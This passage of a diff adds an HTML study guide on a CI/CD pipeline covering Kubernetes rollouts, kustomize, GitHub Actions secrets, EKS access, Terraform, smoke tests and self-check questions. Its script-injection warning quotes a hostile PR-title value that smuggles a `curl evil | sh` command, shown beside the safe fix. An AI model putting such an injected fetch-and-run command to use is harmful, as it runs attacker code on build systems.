+Deployment creates a new ReplicaSet, scales it up, and scales the old one
+down. Commands:</p>
+<pre><code class="language-bash">kubectl rollout status deployment/backend --timeout=180s   # block until done (or fail)
+kubectl rollout undo   deployment/backend                  # back to the previous ReplicaSet
+kubectl rollout history deployment/backend
+</code></pre>
+<p><code>kubectl apply</code> returns as soon as the API server <strong>accepts</strong> the change, not
+when the pods are healthy. Without <code>rollout status</code>, the pipeline would go
+green while a crash-looping pod sits in the cluster.</p>
+
+<h2 id="9-kustomize-templating-without-templates">9. Kustomize: templating without templates</h2>
+<p><strong>Example (from the deploy job):</strong></p>
+<pre><code class="language-bash">cd starter/backend/k8s
+kustomize edit set image backend=$ECR/backend:$GITHUB_SHA   # mutates kustomization.yaml (runner only!)
+kustomize build | kubectl apply -f -                       # render, then apply
+</code></pre>
+<p>After <code>edit set image</code>, <code>kustomization.yaml</code> gains:</p>
+<pre><code class="language-yaml">images:
+  - name: backend                       # matches `image: backend` in deployment.yaml
+    newName: 1234.dkr.ecr.../backend
+    newTag: 5949d91e...
+</code></pre>
+<ul>
+<li>Kustomize <strong>patches</strong> plain YAML. Helm, by contrast, renders <code>{{ }}</code> templates.</li>
+<li><code>kustomize build</code> prints the final manifests. Pipe them to <code>kubectl apply -f -</code>
+  (<code>-</code> means stdin). <code>kubectl apply -k dir/</code> is the built-in shortcut.</li>
+<li><strong>Never commit</strong> the edited <code>kustomization.yaml</code>. The SHA belongs to the
+  pipeline run, not to source control. In GitOps setups (Argo CD, Flux), a bot
+  <em>does</em> commit it, but to a separate config repo.</li>
+<li>Overlays (<code>base/</code> plus <code>overlays/staging</code>, <code>overlays/prod</code>) are how kustomize
+  handles multiple environments.</li>
+</ul>
+
+<h2 id="10-secrets-and-credentials">10. Secrets and credentials</h2>
+<p><strong>Example:</strong></p>
+<pre><code class="language-yaml">- uses: aws-actions/configure-aws-credentials@v6
+  with:
+    aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
+    aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+    aws-region: us-east-1
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Mechanism</th>
+<th>For</th>
+<th>Visible in logs?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>secrets.X</code></td>
+<td>credentials, tokens</td>
+<td>masked as <code>***</code></td>
+</tr>
+<tr>
+<td><code>vars.X</code></td>
+<td>non-sensitive config (e.g. <code>REACT_APP_MOVIE_API_URL</code> override)</td>
+<td>yes</td>
+</tr>
+<tr>
+<td><code>env:</code></td>
+<td>values for steps (workflow, job or step scope)</td>
+<td>yes</td>
+</tr>
+</tbody>
+</table></div>
+<ul>
+<li><strong>Hard-coding credentials is an automatic fail.</strong> Anything committed is
+  public forever, even if you delete it later.</li>
+<li>Secrets are <strong>not</strong> passed to workflows triggered by PRs from forks. That's
+  another reason CI must not need them.</li>
+<li><strong>Least privilege.</strong> Set <code>permissions: contents: read</code> at the top. Grant
+  <code>pull-requests: write</code> only to the job that comments.</li>
+<li><strong>Better than long-lived keys: OIDC.</strong>
+  <code>permissions: id-token: write</code> plus <code>role-to-assume:</code> lets GitHub exchange a
+  short-lived token for temporary AWS credentials. No stored keys means nothing
+  to leak or rotate. The rubric asks for secrets, but know that OIDC exists.</li>
+</ul>
+<p><strong>Script injection.</strong> Don't interpolate untrusted input straight into <code>run:</code>.</p>
+<pre><code class="language-yaml"># BAD: a PR title like `&quot;; curl evil | sh; &quot;` becomes shell code
+- run: echo &quot;${{ github.event.pull_request.title }}&quot;
+# GOOD: pass it through env, so the shell treats it as data
+- run: echo &quot;$TITLE&quot;
+  env: { TITLE: &quot;${{ github.event.pull_request.title }}&quot; }
+</code></pre>
+
+<h2 id="11-eks-authentication-who-may-run-kubectl">11. EKS authentication: who may run <code>kubectl</code>?</h2>
+<p><strong>Example:</strong> in Terraform, <code>aws_eks_access_entry</code> plus
+<code>aws_eks_access_policy_association</code> grant <code>github-action-user</code> the
+<code>AmazonEKSClusterAdminPolicy</code> role.</p>
+<pre class="diagram"><code> GitHub runner --(AWS keys)--&gt; aws eks update-kubeconfig --&gt; kubeconfig uses
+   `aws eks get-token` --&gt; EKS API server: &quot;Is this IAM principal allowed?&quot;
+                                  |
+                 +----------------+------------------+
+                 | Access entries (new, API-based)   |  &lt;- this repo's Terraform
+                 | aws-auth ConfigMap (legacy)       |  &lt;- what init.sh edited
+                 +-----------------------------------+
+</code></pre>
+<ul>
+<li>Being an IAM admin is <strong>not enough</strong>. EKS has its own authorization layer
+  that maps IAM identities to Kubernetes permissions (RBAC).</li>
+<li><code>authentication_mode = "API_AND_CONFIG_MAP"</code> honors both mechanisms.</li>
+<li><code>aws eks update-kubeconfig --name cluster --region us-east-1</code> writes the
+  kubeconfig entry that tells <code>kubectl</code> where the cluster is and how to get
+  a token.</li>
+</ul>
+
+<h2 id="12-infrastructure-as-code-terraform-briefly">12. Infrastructure as Code (Terraform), briefly</h2>
+<pre><code class="language-bash">terraform init      # download providers, configure backend
+terraform plan      # diff: desired (code) vs. actual (state)
+terraform apply     # make it so
+terraform output    # read values such as ECR URLs and cluster name
+terraform destroy   # tear everything down (do it, to stop paying)
+</code></pre>
+<ul>
+<li><strong>State</strong> (<code>terraform.tfstate</code>) maps code to real resource IDs. Never commit
+  it, because it can contain secrets. That's why <code>.gitignore</code> lists
+  <code>*.tfstate</code> and <code>.terraform/</code>.</li>
+<li><strong>Teardown order matters.</strong> Services of <code>type: LoadBalancer</code> create ELBs that
+  Terraform doesn't know about, and they block VPC deletion. Run
+  <code>kubectl delete svc frontend backend</code> first, then <code>terraform destroy</code>.</li>
+</ul>
+
+<h2 id="13-verifying-a-deploy-smoke-tests-and-rollback">13. Verifying a deploy: smoke tests and rollback</h2>
+<p><strong>Example (<code>.github/scripts/smoke-test.sh backend</code>):</strong></p>
+<pre><code class="language-bash">host=$(kubectl get svc backend -o jsonpath='{.status.loadBalancer.ingress[0].hostname}')
+curl --fail &quot;http://$host/movies&quot; | jq -e '.movies | length &gt; 0'
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Test type</th>
+<th>Scope</th>
+<th>Where it runs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unit</td>
+<td>one function or component, dependencies mocked (<code>jest.mock('axios')</code>)</td>
+<td>CI</td>
+</tr>
+<tr>
+<td>Integration</td>
+<td>several components together</td>
+<td>CI</td>
+</tr>
+<tr>
+<td><strong>Smoke</strong></td>
+<td>"is the deployed thing alive and basically correct?"</td>
+<td>after deploy</td>
+</tr>
+<tr>
+<td>End-to-end</td>
+<td>real user journeys in a browser</td>
+<td>after deploy, or nightly</td>
+</tr>
+</tbody>
+</table></div>
+<ul>
+<li><strong>Retry with a timeout.</strong> New ELB DNS names can take minutes to resolve. One
+  <code>curl</code> would flake, and an infinite loop would hang the pipeline.</li>
+<li><strong>Check meaning, not just status.</strong> HTTP 200 from the frontend only proves
+  the static server works. Grepping the bundle for the backend URL proves the
+  build arg was baked in.</li>
+<li><strong>Roll back automatically.</strong> On a failed smoke test, run
+  <code>kubectl rollout undo</code> <em>and still fail the run</em>. Users get the old version
+  back, and the team still sees red.</li>
+</ul>
+
+<h2 id="14-pipeline-hygiene">14. Pipeline hygiene</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Practice</th>
+<th>YAML</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cancel superseded CI runs</td>
+<td><code>concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }</code></td>
+<td>saves minutes; only the latest commit matters</td>
+</tr>
+<tr>
+<td>Never cancel deploys mid-flight</td>
+<td><code>cancel-in-progress: false</code> on CD</td>
+<td>a half-applied deploy is worse than a late one</td>
+</tr>
+<tr>
+<td>Pin tool versions</td>
+<td><code>.nvmrc</code>, <code>python-version: "3.10"</code>, <code>actions/x@v7</code></td>
+<td>CI matches dev and is reproducible (pin to a commit SHA for maximum supply-chain safety)</td>
+</tr>
+<tr>
+<td>Fail loudly</td>
+<td><code>set -euo pipefail</code> in scripts</td>
+<td>a failed <code>curl</code> in a pipe must not be ignored</td>
+</tr>
+<tr>
+<td>Report</td>
+<td>job summary (<code>$GITHUB_STEP_SUMMARY</code>), sticky PR comment, Slack</td>
+<td>feedback where people already look</td>
+</tr>
+<tr>
+<td>Environments</td>
+<td><code>environment: { name: backend-production, url: ... }</code></td>
+<td>deployment history, protection rules, approvals</td>
+</tr>
+</tbody>
+</table></div>
+
+<h2 id="15-monitoring-and-logging-the-course-s-other-half">15. Monitoring and logging (the course's other half)</h2>
+<p>The pipeline proves a release <em>started</em> healthy. Observability tells you it
+<em>stays</em> healthy.</p>
+<ul>
+<li><strong>Logs.</strong> <code>kubectl logs deploy/backend</code>, <code>docker logs mp-backend</code>. In
+  production, ship them to CloudWatch, Loki or ELK.</li>
+<li><strong>Metrics.</strong> Request rate, errors and duration (RED); CPU and memory. Use
+  Prometheus and Grafana or CloudWatch Container Insights.</li>
+<li><strong>Health probes.</strong> <code>readinessProbe</code> (don't send traffic yet) and
+  <code>livenessProbe</code> (restart me). These make <code>rollout status</code> meaningful, because
+  a pod only counts as available once it's ready.</li>
+<li><strong>Alerts</strong> on symptoms users feel (error rate, latency), not just on causes.</li>
+</ul>
+
+<h2 id="16-gotchas-i-hit-or-that-the-rubric-targets">16. Gotchas I hit or that the rubric targets</h2>
+<ol>
+<li><code>npm test</code> without <code>CI=true</code> starts <strong>watch mode</strong> and hangs the job forever.</li>
+<li><code>pipenv install</code> without <code>--dev</code> gives you no <code>flake8</code>, so <code>pipenv run lint</code> fails.</li>
+<li>The backend's <code>Pipfile</code> requires <strong>Python 3.10</strong>. A different Python breaks <code>pipenv install</code>.</li>
+<li><code>REACT_APP_*</code> is <strong>build-time</strong> (section 6). Forgetting <code>--build-arg</code> gives <code>undefined/movies</code> requests in the browser.</li>
+<li>Missing <code>needs:</code> means build and deploy can run after failed tests, which is an automatic fail.</li>
+<li>Re-applying the same <code>:latest</code> tag triggers <strong>no rollout</strong>. Use the SHA.</li>
+<li><code>kubectl apply</code> succeeding ≠ app healthy. Use <code>rollout status</code> plus a smoke test.</li>
+<li>Delete LoadBalancer Services before <code>terraform destroy</code>, or the VPC deletion hangs.</li>
+<li>Building on Apple Silicon (arm64) for x86 nodes: use <code>--platform linux/amd64</code>, or you get <code>exec format error</code> in pods.</li>
+<li>Path filters exclude the workflow file unless you list it.</li>
+</ol>
+
+<h2 id="17-self-check-questions">17. Self-check questions</h2>
+<details><summary>1. Lint and test pass; build fails. Does deploy run? Is the run green?</summary><div class="answer">No. Deploy <code>needs: build</code>, so it's skipped. The run's conclusion is failure.</div></details>
+
+<details><summary>2. Why can't the frontend read the backend URL from a Kubernetes env var at runtime?</summary><div class="answer">CRA inlines <code>process.env.REACT_APP_*</code> into static JS during <code>npm run build</code>. The browser runs that JS, and no server process ever reads the pod's environment.</div></details>
+
+<details><summary>3. Two jobs both run <code>npm ci</code>. Why not install once and share?</summary><div class="answer">Each job runs on a separate fresh VM. Share the download cache (<code>cache: npm</code>) instead of <code>node_modules</code>, and use artifacts for real build outputs.</div></details>
+
+<details><summary>4. What's the difference between <code>secrets.X</code> and <code>vars.X</code>?</summary><div class="answer">Secrets are encrypted, masked in logs, and withheld from fork PRs. Vars are plain configuration.</div></details>
+
+<details><summary>5. You pushed a new image as <code>:latest</code> and ran <code>kubectl apply</code>. Nothing changed. Why?</summary><div class="answer">The Deployment spec is byte-identical, so there's no rollout. Tag with a unique SHA, or <code>kubectl rollout restart</code> with <code>imagePullPolicy: Always</code>, which is the worse option.</div></details>
+
+<details><summary>6. Why does <code>report</code> use <code>if: always()</code>, and can it make a failed run pass?</summary><div class="answer">So results are reported even on failure. No: the run fails if any job fails.</div></details>
+
+<details><summary>7. What does <code>kustomize edit set image backend=REPO:TAG</code> match on?</summary><div class="answer">The <code>image: backend</code> name in the container spec. It writes an <code>images:</code> override into <code>kustomization.yaml</code>.</div></details>
+
+<details><summary>8. How does <code>github-action-user</code> get permission to run kubectl?</summary><div class="answer">IAM credentials authenticate it to AWS. An EKS access entry with <code>AmazonEKSClusterAdminPolicy</code> (or the legacy aws-auth ConfigMap) authorizes it inside Kubernetes.</div></details>
+
+<details><summary>9. Why put <code>COPY package*.json</code> and <code>RUN npm ci</code> before <code>COPY . .</code>?</summary><div class="answer">Layer caching. Source changes then don't invalidate the expensive dependency-install layer.</div></details>
+
+<details><summary>10. What's the safest way to give Actions AWS access?</summary><div class="answer">OIDC federation (<code>id-token: write</code> plus <code>role-to-assume</code>). Credentials are short-lived and nothing is stored.</div></details>
+
+
+<h2 id="key-points">Key points</h2>
+<ul>
+<li><strong>CI</strong> answers "safe to merge?" on PRs, with no secrets. <strong>CD</strong> answers "ship it" on <code>main</code>, with credentials.</li>
+<li><strong>Jobs = separate VMs</strong> that run in parallel. <strong>Steps = one VM</strong>, sequential. <code>needs</code> is the quality gate; <code>outputs</code> carry values between jobs.</li>
+<li><strong>Cache</strong> dependencies keyed on the lockfile. <strong>Composite actions</strong> remove repeated steps.</li>
+<li><strong>Docker layer order</strong> decides build speed. Buildx with <code>type=gha</code> persists the cache across ephemeral runners.</li>
+<li><strong>React env vars are build-time.</strong> Bake the backend URL in with <code>--build-arg</code>, and verify it.</li>
+<li><strong>Tag images with the git SHA.</strong> That gives traceability, real rollouts and easy rollback.</li>
+<li><strong>Kubernetes is declarative.</strong> <code>apply</code> is accepted asynchronously, so wait for <code>rollout status</code>, then smoke-test, and <code>rollout undo</code> on failure.</li>
+<li><strong>Never hard-code credentials.</strong> Use least-privilege <code>permissions</code>, and prefer OIDC.</li>
+<li><strong>Tear down</strong> LoadBalancer Services first, then <code>terraform destroy</code>.</li>
+</ul>
+  </main>
+</div>
+
+<script>
+  // Highlight the section currently in view in the sticky index.
+  (() => {
+    const links = new Map();
+    document.querySelectorAll('nav.toc a').forEach((a) => links.set(a.getAttribute('href').slice(1), a));
+    const headings = [...document.querySelectorAll('main h2[id]')];
+    const setActive = (id) => links.forEach((a, key) => a.classList.toggle('active', key === id));
+    const onScroll = () => {
+      let current = headings[0]?.id;
+      for (const h of headings) { if (h.getBoundingClientRect().top < 120) current = h.id; }
+      setActive(current);
+    };
+    document.addEventListener('scroll', onScroll, { passive: true });
+    onScroll();
+  })();
+</script>
+
+</body>
+</html>
